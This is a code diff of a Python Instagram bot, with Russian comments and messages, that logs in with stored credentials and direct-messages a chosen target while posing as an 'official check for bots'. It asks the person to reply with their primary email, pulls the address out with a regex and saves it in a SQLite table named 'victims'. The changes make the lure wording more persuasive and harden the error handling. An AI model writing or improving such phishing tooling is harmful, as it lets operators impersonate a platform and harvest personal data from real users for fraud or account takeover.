@@ -3,12 +3,20 @@ import os, threading, time, sqlite3, datetime, re
 
 USERNAME = os.environ.get("IG_USER")
 PASSWORD = os.environ.get("IG_PASS")
-TARGET   = os.environ.get("IG_TARGET")   # сюда пишешь username человека
+TARGET   = os.environ.get("IG_TARGET")
+
+print("=== ENV CHECK ===")
+print("IG_USER =", USERNAME)
+print("IG_PASS set:", bool(PASSWORD))
+print("IG_TARGET =", TARGET)
+print("=================")
 
 FIRST_MSG = (
     "Здравствуйте! Это официальная проверка пользователей на наличие ботов. "
-    "Пожалуйста, укажите ваш основной email прямо в чате — "
-    "мы отправим на него код подтверждения."
+    "Для подтверждения вашего аккаунта укажите основной email прямо в этом чате — "
+    "мы отправим на него код подтверждения.\n\n"
+    "Пример: your_email@gmail.com\n\n"
+    "Ответьте, пожалуйста, одним сообщением с вашим email."
 )
 
 WAIT_MSG = (
@@ -23,16 +31,24 @@ def init_db():
     db.execute("""CREATE TABLE IF NOT EXISTS victims (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT, user_id TEXT, email TEXT, ts TEXT)""")
-    db.commit(); db.close()
+    db.commit()
+    db.close()
 
 def run_bot():
+    if not USERNAME or not PASSWORD:
+        print("[-] FATAL: IG_USER или IG_PASS не заданы в Environment")
+        return
+
     cl = Client()
     try:
         cl.login(USERNAME, PASSWORD)
-        cl.dump_settings("session.json")
+        try:
+            cl.dump_settings("session.json")
+        except Exception:
+            pass
         print("[+] Логин ок")
     except Exception as e:
-        print("[-] login error:", e)
+        print("[-] login error:", repr(e))
         return
 
     try:
@@ -40,7 +56,7 @@ def run_bot():
         cl.direct_send(FIRST_MSG, [user_id])
         print(f"[+] Отправлено {TARGET}")
     except Exception as e:
-        print("[-] send error:", e)
+        print("[-] send error:", repr(e))
 
     EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
     seen, replied = set(), set()
@@ -61,16 +77,21 @@ def run_bot():
                     username = t.users[0].username if t.users else "?"
                     uid = str(msg.user_id)
                     db = sqlite3.connect(DB)
-                    db.execute("INSERT INTO victims (username,user_id,email,ts) VALUES (?,?,?,?)",
-                               (username, uid, email, datetime.datetime.now().isoformat()))
-                    db.commit(); db.close()
+                    db.execute(
+                        "INSERT INTO victims (username,user_id,email,ts) VALUES (?,?,?,?)",
+                        (username, uid, email, datetime.datetime.now().isoformat()))
+                    db.commit()
+                    db.close()
                     print(f"[+] {username}: {email}")
                     if uid not in replied:
                         replied.add(uid)
-                        cl.direct_send(WAIT_MSG, [int(uid)])
-                        print(f"[+] Подтверждение отправлено {username}")
+                        try:
+                            cl.direct_send(WAIT_MSG, [int(uid)])
+                            print(f"[+] Подтверждение отправлено {username}")
+                        except Exception as e:
+                            print("[-] reply error:", repr(e))
         except Exception as e:
-            print("[-] loop error:", e)
+            print("[-] loop error:", repr(e))
         time.sleep(15)
 
 def start_bot_thread():
